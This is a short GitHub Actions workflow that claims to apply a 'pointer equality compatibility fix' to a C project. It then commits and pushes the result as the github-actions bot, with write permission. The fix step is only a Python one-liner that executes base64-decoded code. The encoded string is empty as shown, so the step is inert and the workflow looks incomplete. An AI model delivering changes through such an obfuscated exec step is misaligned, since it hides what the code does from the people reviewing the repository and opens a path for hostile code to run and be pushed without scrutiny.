name: migrate-pointer-equality

on:
  push:
    branches:
      - fix/pointer-equality-compatibility

permissions:
  contents: write

jobs:
  migrate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: fix/pointer-equality-compatibility
      - name: Apply pointer equality compatibility fix
        run: python3 -c "import base64;exec(base64.b64decode(''))"
      - name: Run full test suite
        run: make clean && make test
      - name: Commit migrated files
        run: |
          if git diff --quiet -- type.c Makefile test/pointer_equality.sh; then exit 0; fi
          git config user.name github-actions[bot]
          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
          git add type.c Makefile test/pointer_equality.sh
          git commit -m 'Enforce compatible pointer equality operands'
          git push origin HEAD:fix/pointer-equality-compatibility
